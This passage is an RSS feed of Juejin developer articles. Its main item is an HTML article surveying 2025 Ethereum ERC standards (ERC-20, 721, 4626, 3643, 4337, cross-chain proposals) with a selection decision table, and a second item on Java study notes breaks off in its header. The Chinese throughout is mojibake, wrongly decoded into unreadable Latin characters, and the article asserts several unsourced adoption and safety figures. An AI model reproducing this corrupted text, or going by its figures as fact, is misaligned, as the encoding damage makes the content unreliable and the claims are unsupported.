<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[2025å¹´ERCæ ‡å‡†æŠ€æœ¯åœ°å›¾ï¼šå¼€å‘è€…çš„æ ¸å¿ƒåè®®é€‰å‹ä¸å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7580988382761205775</link>    <guid>https://juejin.cn/post/7580988382761205775</guid>    <pubDate>2025-12-08T05:21:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580988382761205775" data-draft-id="7580616979473448966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025å¹´ERCæ ‡å‡†æŠ€æœ¯åœ°å›¾ï¼šå¼€å‘è€…çš„æ ¸å¿ƒåè®®é€‰å‹ä¸å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="web3,æ™ºèƒ½åˆçº¦,Solidity"/> <meta itemprop="datePublished" content="2025-12-08T05:21:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ¨è¥¿"/> <meta itemprop="url" content="https://juejin.cn/user/2436173496845549"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025å¹´ERCæ ‡å‡†æŠ€æœ¯åœ°å›¾ï¼šå¼€å‘è€…çš„æ ¸å¿ƒåè®®é€‰å‹ä¸å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173496845549/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ¨è¥¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:21:04.000Z" title="Mon Dec 08 2025 05:21:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<blockquote>
<p>åœ¨åŒºå—é“¾çš„æµ©ç€šæ˜Ÿç©ºä¸­ï¼ŒERCæ ‡å‡†å¦‚åŒä¸€é¢—é¢—ç²¾å¯†æ ¡å‡†çš„æ˜Ÿè¾°ï¼Œæ„æˆäº†ä»¥å¤ªåŠç”Ÿæ€ç³»ç»Ÿæœ€åšå®çš„åæ ‡ç³»ã€‚ä»2015å¹´ERC-20å¼€å¯ä»£å¸åŒ–æµªæ½®ï¼Œåˆ°å¦‚ä»Šè¶…è¿‡200é¡¹ææ¡ˆäº¤ç»‡æˆçš„æ ‡å‡†åŒ–ç½‘ç»œï¼Œè¿™äº›æŠ€æœ¯è§„èŒƒä¸ä»…å®šä¹‰äº†æ•°å­—èµ„äº§çš„äº¤äº’è¯­è¨€ï¼Œæ›´åœ¨2025å¹´æˆä¸ºè¿æ¥è™šæ‹Ÿç»æµä¸å®ä½“ä¸–ç•Œçš„æ¡¥æ¢ã€‚</p>
<p>å½“å‰ï¼Œæˆ‘ä»¬æ­£ç«™åœ¨Web3å‘å±•å²ä¸Šçš„å…³é”®æ‹ç‚¹ã€‚ç›‘ç®¡æ¡†æ¶çš„æˆç†Ÿï¼ˆå¦‚é¦™æ¸¯ç¨³å®šå¸æ¡ä¾‹ä¸RWAç™»è®°å¹³å°ï¼‰ã€æŠ€æœ¯æ ˆçš„å·¥ä¸šåŒ–ï¼ˆEIP-4337è´¦æˆ·æŠ½è±¡æ™®åŠç‡è¶…60%ï¼‰ï¼Œä»¥åŠè·¨é“¾äº’æ“ä½œæ€§çš„åˆšéœ€ï¼Œå…±åŒæ¨åŠ¨äº†ERCæ ‡å‡†ä»"å¯é€‰é¡¹"å‘"å¿…é€‰é¡¹"çš„èœ•å˜ã€‚æ— è®ºæ˜¯DeFiåè®®è¿½æ±‚èµ„æœ¬æ•ˆç‡çš„æè‡´ä¼˜åŒ–ï¼Œè¿˜æ˜¯RWAèµ„äº§é¢ä¸´åˆè§„è½åœ°çš„åˆšæ€§çº¦æŸï¼Œäº¦æˆ–æ˜¯æ™®é€šç”¨æˆ·å¯¹æ— æ„ŸåŒ–ä½“éªŒçš„è¿«åˆ‡éœ€æ±‚ï¼Œéƒ½åœ¨å‘¼å”¤ä¸€ä¸ªæ›´æ¸…æ™°ã€æ›´å®ç”¨ã€æ›´å…·å‰ç»æ€§çš„æ ‡å‡†å¯¼èˆªå›¾ã€‚</p>
<p>æœ¬æ–‡å°†æŠ›å´å†—é•¿è®ºè¿°ï¼Œä»¥å·¥ç¨‹å¸ˆçš„åŠ¡å®è§†è§’ï¼Œä¸ºæ‚¨å‘ˆç°ä¸€ä»½2025å¹´ERCæ ‡å‡†çš„"æ´»åœ°å›¾"ã€‚æˆ‘ä»¬ä¸ä»…ä¼šæ‹†è§£ERC-20ã€ERC-721ç­‰åŸºçŸ³æ€§åè®®çš„ç”Ÿå­˜æ³•åˆ™ï¼Œæ›´ä¼šæ·±åº¦èšç„¦ERC-4626ï¼ˆDeFiæ”¶ç›Šå±‚äº‹å®æ ‡å‡†ï¼‰ã€ERC-3643ï¼ˆRWAåˆè§„å”¯ä¸€è·¯å¾„ï¼‰ã€ERC-4337ï¼ˆç”¨æˆ·ä½“éªŒé©å‘½ï¼‰è¿™ä¸‰å¤§æ”¹å˜è¡Œä¸šæ ¼å±€çš„æ–°æ˜Ÿã€‚åŒæ—¶ï¼Œæˆ‘ä»¬æ¢³ç†äº†è·¨é“¾èµ„äº§ã€AIç”Ÿæˆå†…å®¹ã€æŠ—é‡å­å®‰å…¨ç­‰å‰æ²¿é¢†åŸŸçš„æœ€æ–°è§„èŒƒï¼Œå¹¶é™„ä¸Šä¸€ä»½å¯ç›´æ¥ç”¨äºç”Ÿäº§ç¯å¢ƒçš„"æŠ€æœ¯é€‰å‹å†³ç­–è¡¨"ã€‚
æ— è®ºæ‚¨æ˜¯æ„å»ºä¸‹ä¸€ä¸ªæ€æ‰‹çº§åº”ç”¨çš„å¼€å‘è€…ï¼Œè¿˜æ˜¯è¯„ä¼°é¡¹ç›®æŠ€æœ¯åŸºæœ¬é¢çš„æŠ•èµ„è€…ï¼Œäº¦æˆ–æ˜¯æ¢ç´¢Web3è¾¹ç•Œçš„åˆ›æ–°è€…ï¼Œè¿™ä»½æ±‡æ€»éƒ½å°†æˆä¸ºæ‚¨ç©¿è¶Šå¤æ‚æŠ€æœ¯è¿·é›¾çš„æŒ‡å—é’ˆâ€”â€”å› ä¸ºåœ¨è¿™ä¸ªæ ‡å‡†åŒ–é©±åŠ¨çš„æ—¶ä»£ï¼Œé€‰æ‹©æ­£ç¡®çš„ERCæ ‡å‡†ï¼Œå°±æ˜¯é€‰æ‹©äº†é€šå¾€æœªæ¥çš„æ·å¾„ã€‚</p>
</blockquote>
<h2 data-id="heading-1">ERCæ ‡å‡†æ˜¯ä»€ä¹ˆ</h2>
<p>ERCï¼ˆEthereum Request for Commentï¼‰æ˜¯ä»¥å¤ªåŠå¼€å‘è€…æäº¤çš„åè®®ææ¡ˆï¼Œç»EIPæµç¨‹æ‰¹å‡†åæˆä¸ºå¼ºåˆ¶æ€§æˆ–æ¨èæ€§æ ‡å‡†ã€‚æˆªè‡³2025å¹´ï¼Œä»¥å¤ªåŠç”Ÿæ€å·²æœ‰è¶…è¿‡200ä¸ªERCæ ‡å‡†ï¼Œå…¶ä¸­çº¦30ä¸ªè¢«å¹¿æ³›ä½¿ç”¨</p>
<h2 data-id="heading-2"><strong>æ ¸å¿ƒä»£å¸æ ‡å‡†åˆ†ç±»</strong></h2>
<h4 data-id="heading-3">1. <strong>åŒè´¨åŒ–ä»£å¸</strong></h4>


























<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>åŠŸèƒ½ç®€è¿°</th><th>åº”ç”¨åœºæ™¯</th><th>2025å¹´çŠ¶æ€</th></tr></thead><tbody><tr><td><strong>ERC-20</strong></td><td>Token Standard</td><td>åŸºç¡€è½¬è´¦ã€æˆæƒã€ä½™é¢æŸ¥è¯¢</td><td>USDTã€UNIã€æ‰€æœ‰æ²»ç†ä»£å¸</td><td>âœ… ç»å¯¹åŸºçŸ³ï¼Œ100%é¡¹ç›®ä½¿ç”¨</td></tr><tr><td><strong>ERC-2612</strong></td><td>Permit Extension</td><td>ç¦»çº¿ç­¾åæˆæƒï¼ˆæ— gas approveï¼‰</td><td>DAIã€USDCã€DeFiåè®®é›†æˆ</td><td>âœ… æ–°ä»£å¸æ ‡é…ï¼Œç”¨æˆ·ä½“éªŒå¿…å¤‡</td></tr></tbody></table>
<h4 data-id="heading-4">2. <strong>éåŒè´¨åŒ–ä»£å¸</strong></h4>








































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>åŠŸèƒ½ç®€è¿°</th><th>åº”ç”¨åœºæ™¯</th><th>2025å¹´çŠ¶æ€</th></tr></thead><tbody><tr><td><strong>ERC-721</strong></td><td>NFT Standard</td><td>å”¯ä¸€Token IDï¼Œä¸å¯åˆ†å‰²</td><td>æ•°å­—è‰ºæœ¯å“ã€PFPã€æ”¶è—å“</td><td>âœ… NFTé»„é‡‘æ ‡å‡†</td></tr><tr><td><strong>ERC-1155</strong></td><td>Multi-Token</td><td>åŒæ—¶æ”¯æŒFTå’ŒNFTï¼Œæ‰¹é‡æ“ä½œ</td><td>GameFiè£…å¤‡ã€å…ƒå®‡å®™èµ„äº§</td><td>âœ… GameFié¦–é€‰ï¼Œæ•ˆç‡æ›´é«˜</td></tr><tr><td><strong>ERC-721A</strong></td><td>Gas-Optimized NFT</td><td>æ‰¹é‡é“¸é€ èŠ‚çœ60% Gas</td><td>å¤§å‹é¡¹ç›®å‘è¡Œï¼ˆå¦‚Azukiï¼‰</td><td>âœ… 2025å¹´ä¸»æµå‘è¡Œæ–¹æ¡ˆ</td></tr><tr><td><strong>ERC-2981</strong></td><td>Royalty Standard</td><td>NFTç‰ˆç¨ä¿¡æ¯æ ‡å‡†åŒ–</td><td>è·¨å¸‚åœºç‰ˆç¨æ‰§è¡Œ</td><td>âœ… å¸‚åœºå¼ºåˆ¶è¦æ±‚</td></tr></tbody></table>
<h4 data-id="heading-5">3. <strong>æ”¶ç›Šä¸é‡‘åº“æ ‡å‡†</strong></h4>


























<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ä»£è¡¨é¡¹ç›®</th><th>é‡è¦æ€§</th></tr></thead><tbody><tr><td><strong>ERC-4626</strong></td><td>Tokenized Vault</td><td>ç»Ÿä¸€é‡‘åº“å­˜å–æ¬¾æ¥å£ï¼Œè‡ªåŠ¨å¤åˆ©</td><td>Yearnã€Aaveã€Compound</td><td>â­â­â­â­â­ æ”¶ç›Šå±‚äº‹å®æ ‡å‡†</td></tr><tr><td><strong>ERC-4626æ‰©å±•</strong></td><td>æ”¶ç›Šä¼˜åŒ–</td><td>æ»‘ç‚¹ä¿æŠ¤ã€çº¿æ€§é‡Šæ”¾</td><td>Balancerã€Aura</td><td>â­â­â­â­ å¤§å‹DeFiæ ‡é…</td></tr></tbody></table>
<h4 data-id="heading-6">4. <strong>ç°å®ä¸–ç•Œèµ„äº§ï¼ˆRWAï¼‰åˆè§„æ ‡å‡†</strong></h4>

































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>é€‚ç”¨èµ„äº§</th><th>ç›‘ç®¡è¦æ±‚</th></tr></thead><tbody><tr><td><strong>ERC-3643</strong></td><td>T-REX Protocol</td><td>å¼ºåˆ¶èº«ä»½éªŒè¯ã€åŠ¨æ€åˆè§„è§„åˆ™</td><td>è¯åˆ¸ã€æˆ¿åœ°äº§ã€åŸºé‡‘</td><td>âœ… é¦™æ¸¯RWAå¹³å°å¼ºåˆ¶ä½¿ç”¨</td></tr><tr><td><strong>ERC-1400</strong></td><td>Security Token</td><td>è¯åˆ¸å‹ä»£å¸æ ‡å‡†</td><td>STOå‘è¡Œ</td><td>âš ï¸ è¢«ERC-3643é€æ­¥æ›¿ä»£</td></tr><tr><td><strong>ERC-3475</strong></td><td>Bonds Standard</td><td>å€ºåˆ¸æ ‡å‡†ï¼Œå¤æ‚è®¡æ¯</td><td>é“¾ä¸Šå€ºåˆ¸</td><td>ğŸ”¥ 2025å¹´å€ºåˆ¸ä»£å¸åŒ–çƒ­ç‚¹</td></tr></tbody></table>
<h4 data-id="heading-7">5. <strong>è´¦æˆ·ä¸ç­¾åæ ‡å‡†</strong></h4>

































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>è§£å†³ç—›ç‚¹</th><th>æ™®åŠåº¦</th></tr></thead><tbody><tr><td><strong>ERC-4337</strong></td><td>Account Abstraction</td><td>æ™ºèƒ½åˆçº¦é’±åŒ…ï¼Œç¤¾äº¤æ¢å¤</td><td>ç§é’¥ä¸¢å¤±ã€æ‰¹é‡æ“ä½œ</td><td>âœ… MetaMask/Coinbaseå·²æ”¯æŒ</td></tr><tr><td><strong>ERC-1271</strong></td><td>Contract Signature</td><td>åˆçº¦é’±åŒ…ç­¾åéªŒè¯</td><td>Gnosis Safeäº¤äº’</td><td>âœ… å¤šç­¾/æ™ºèƒ½é’±åŒ…åŸºçŸ³</td></tr><tr><td><strong>ERC-5267</strong></td><td>EIP-712 Discovery</td><td>é“¾ä¸Šå‘ç°ç±»å‹å®šä¹‰</td><td>é’±åŒ…è‡ªåŠ¨è§£æç­¾å</td><td>ğŸ”¥ 2025å¹´é’±åŒ…é›†æˆä¸­</td></tr></tbody></table>
<h4 data-id="heading-8">6. <strong>è·¨é“¾ä¸äº’æ“ä½œæ ‡å‡†</strong></h4>


























<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ä»£è¡¨é¡¹ç›®</th><th>çŠ¶æ€</th></tr></thead><tbody><tr><td><strong>ERC-7765</strong></td><td>Omnichain FT</td><td>åŸç”Ÿè·¨é“¾FTï¼ˆæ— æ¡¥ï¼‰</td><td>LayerZero Omniä»£å¸</td><td>ğŸ”¥ 2025è·¨é“¾æ–°æ ‡å‡†</td></tr><tr><td><strong>ERC-7651</strong></td><td>Omnichain NFT</td><td>åŸç”Ÿè·¨é“¾NFT</td><td>å…¨é“¾æ¸¸æˆèµ„äº§</td><td>ğŸ”¥ å…¨é“¾æ¸¸æˆå¿…å¤‡</td></tr></tbody></table>
<h4 data-id="heading-9">7. <strong>ç‰ˆç¨ä¸å…ƒæ•°æ®æ ‡å‡†</strong></h4>

































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>åº”ç”¨åœºæ™¯</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><strong>ERC-2981</strong></td><td>Royalty Standard</td><td>ç‰ˆç¨ä¿¡æ¯é“¾ä¸Šæ ‡å‡†åŒ–</td><td>NFTå¸‚åœºè·¨å¹³å°ç‰ˆç¨</td><td>âš ï¸ å¼ºåˆ¶æ‰§è¡Œä»ä¾èµ–å¸‚åœº</td></tr><tr><td><strong>ERC-4883</strong></td><td>SVG NFT</td><td>å¯ç»„åˆSVGæ ¼å¼</td><td>é“¾ä¸Šæ¸¸æˆã€åŠ¨æ€è‰ºæœ¯</td><td>ğŸ”¥ èŠ‚çœGasï¼Œå®Œå…¨é“¾ä¸Š</td></tr><tr><td><strong>ERC-1948</strong></td><td>Dynamic Data NFT</td><td>32å­—èŠ‚æ•°æ®å­—æ®µå¯æ›´æ–°</td><td>å¯è¿›åŒ–NFT</td><td>âš ï¸ ä½¿ç”¨è¾ƒå°‘</td></tr></tbody></table>
<h4 data-id="heading-10">8. <strong>æ–°å…´æ ‡å‡†</strong></h4>








































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>åˆ›æ–°ç‚¹</th><th>èµ›é“</th><th>æˆç†Ÿåº¦</th></tr></thead><tbody><tr><td><strong>ERC-7007</strong></td><td>AI-NFT</td><td>ç»‘å®šAIæ¨¡å‹ä¸ç”Ÿæˆè¯æ˜</td><td>AIGC</td><td>ğŸ”¬ å®éªŒé˜¶æ®µ</td></tr><tr><td><strong>ERC-721C</strong></td><td>Creator Token</td><td>å¯ç¼–ç¨‹ç‰ˆç¨ç‡ï¼ˆä¸é™2.5%ï¼‰</td><td>åˆ›ä½œè€…ç»æµ</td><td>ğŸ”¥ å¼€å§‹æ™®åŠ</td></tr><tr><td><strong>ERC-7512</strong></td><td>Onchain Audit</td><td>é“¾ä¸Šå­˜å‚¨å®¡è®¡æŠ¥å‘Š</td><td>å®‰å…¨</td><td>ğŸ”¬ å®¡è®¡æ ‡å‡†åŒ–</td></tr><tr><td><strong>ERC-7231</strong></td><td>Identity Aggregator</td><td>å¤šé“¾èº«ä»½èšåˆ</td><td>AIä»£ç†èº«ä»½</td><td>ğŸ”¬ æ—©æœŸé‡‡ç”¨</td></tr></tbody></table>
<h2 data-id="heading-11"><strong>å¿«é€Ÿé€‰æ‹©å†³ç­–è¡¨</strong></h2>





















































<table><thead><tr><th>ä½ çš„éœ€æ±‚</th><th>ç¬¬ä¸€é€‰æ‹©</th><th>å¤‡é€‰æ–¹æ¡ˆ</th><th>é¿å…ä½¿ç”¨</th></tr></thead><tbody><tr><td>å‘æ²»ç†ä»£å¸</td><td>ERC-20 + ERC-2612</td><td>çº¯ERC-20</td><td>ERC-721ï¼ˆç”¨é”™æ ‡å‡†ï¼‰</td></tr><tr><td>å‘NFTé¡¹ç›®</td><td>ERC-721A</td><td>ERC-721</td><td>ERC-1155ï¼ˆé™¤éGameFiï¼‰</td></tr><tr><td>åšGameFi</td><td>ERC-1155</td><td>ERC-721A</td><td>ERC-20ï¼ˆä¸å¯æ›¿ä»£ï¼‰</td></tr><tr><td>å»ºæ”¶ç›Šæ± </td><td>ERC-4626</td><td>è‡ªå®šä¹‰é‡‘åº“</td><td>æ‰‹åŠ¨åˆ†å‘æ”¶ç›Š</td></tr><tr><td>å‘RWAèµ„äº§</td><td>ERC-3643</td><td>æ— </td><td>ERC-20ï¼ˆä¸åˆè§„ï¼‰</td></tr><tr><td>æ™ºèƒ½é’±åŒ…</td><td>ERC-4337</td><td>æ— </td><td>EOAé’±åŒ…ï¼ˆä½“éªŒå·®ï¼‰</td></tr><tr><td>è·¨é“¾èµ„äº§</td><td>ERC-7765</td><td>ERC-7651</td><td>åŸç”Ÿæ¡¥ï¼ˆé£é™©é«˜ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-12"><strong>é€‰å‹å»ºè®®</strong></h2>
<ul>
<li><strong>æ–°é¡¹ç›®å¿…é¡»é›†æˆERC-2612ï¼šå‘Šåˆ«æ— é™æˆæƒï¼Œæå‡ç”¨æˆ·ä½“éªŒ</strong></li>
<li><strong>DeFié¡¹ç›®å¿…é¡»é‡‡ç”¨ERC-4626ï¼šé™ä½å¤–éƒ¨é›†æˆæˆæœ¬ï¼Œè‡ªåŠ¨è·å¾—èšåˆå™¨æ”¯æŒ</strong></li>
<li><strong>RWAé¡¹ç›®å¿…é€‰ERC-3643ï¼šé¦™æ¸¯ã€æ–°åŠ å¡ç›‘ç®¡æ˜ç¡®è¦æ±‚</strong></li>
<li><strong>é’±åŒ…å¿…é¡»æ”¯æŒERC-4337ï¼šæä¾›ç¤¾äº¤æ¢å¤å’Œgasä»£ä»˜ï¼Œå¦åˆ™ç”¨æˆ·æµå¤±</strong></li>
<li><strong>è·¨é“¾é¡¹ç›®å…³æ³¨ERC-7765ï¼šåŸç”Ÿè·¨é“¾æ¯”æ¡¥æ¥å®‰å…¨10å€ä»¥ä¸Š</strong></li>
</ul>
<h2 data-id="heading-13">æ€»ç»“</h2>
<p>ERC-20/721æ˜¯"è¿‡å»"ï¼ŒERC-4626/3643/4337æ˜¯"ç°åœ¨"ï¼ŒERC-7765/7007/7512æ˜¯"æœªæ¥"ã€‚2025å¹´å¼€å‘æ–°é¡¹ç›®ï¼Œåˆè§„æ€§ï¼ˆRWAç”¨3643ï¼‰ã€ç”¨æˆ·ä½“éªŒï¼ˆé’±åŒ…ç”¨4337ï¼‰ã€æ€§èƒ½ï¼ˆæ‰©å®¹ç”¨ZKï¼‰ä¸‰è€…ç¼ºä¸€ä¸å¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¦ä¹ ç¬”è®°:å¼‚å¸¸ï¼Œæ³›å‹ï¼Œé›†åˆï¼ˆä»£ç ç¤ºä¾‹ï¼Œä¼ä¸šé¢è¯•é¢˜ï¼Œä¼ä¸šå®é™…åº”ç”¨åœºæ™¯ï¼‰]]></title>    <link>https://juejin.cn/post/7581004702945214491</link>    <guid>https://juejin.cn/post/7581004702945214491</guid>    <pubDate>2025-12-08T04:04:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702945214491" data-draft-id="7581004702945181723" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­¦ä¹ ç¬”è®°:å¼‚å¸¸ï¼Œæ³›å‹ï¼Œé›†åˆï¼ˆä»£ç ç¤ºä¾‹ï¼Œä¼ä¸šé¢è¯•é¢˜ï¼Œä¼ä¸šå®é™…åº”ç”¨åœºæ™¯ï¼‰"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T04:04:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sin60"/> <meta itemprop="url" content="https://juejin.cn/user/1576027017202505"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­¦ä¹ ç¬”è®°:å¼‚å¸¸ï¼Œæ³›å‹ï¼Œé›†åˆï¼ˆä»£ç ç¤ºä¾‹ï¼Œä¼ä¸šé¢è¯•é¢˜ï¼Œä¼ä¸šå®é™…åº”ç”¨åœºæ™¯ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1576027017202505/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sin60
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:04:45.000Z" title="Mon Dec 08 2025 04:04:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
